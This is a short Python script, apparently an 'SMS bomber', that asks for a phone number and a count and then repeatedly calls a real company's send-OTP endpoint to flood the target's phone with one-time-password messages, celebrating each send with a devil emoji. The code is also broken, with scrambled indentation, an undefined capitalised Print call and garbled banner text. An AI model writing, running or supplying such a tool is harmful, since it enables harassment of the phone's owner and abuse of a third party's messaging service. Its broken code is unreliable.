
import requests ,os

os.system("clear")

 

  

   noob="""

  

   /\   |  __ \     /\   |  ____/\|__   __| \ \ / /\n/  \  | |__) |   /  \  | |__ /  \  | |_____\ V / \n   / /\ \ |  _  /   / /\ \ |  __/ /\ \ | |______> <  \n/ ____ \| | \ \  / ____ \| | / ____ \| |     / . \ \n/_/    \_\_|  \_\/_/    \_\_|/_/    \_\_|    /_/ \_\

   

    

     """

     

     Print(Arafat)

     

      

       

        number=str(input(" Enter Ther Number : "))

        amount=int(input(" Enter SMS amount: "))

        

        api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

        

        for i in range (amount):

        	requests.get(api) 

        	print(str(i+1)+"SMS SENT ðŸ˜ˆ") 
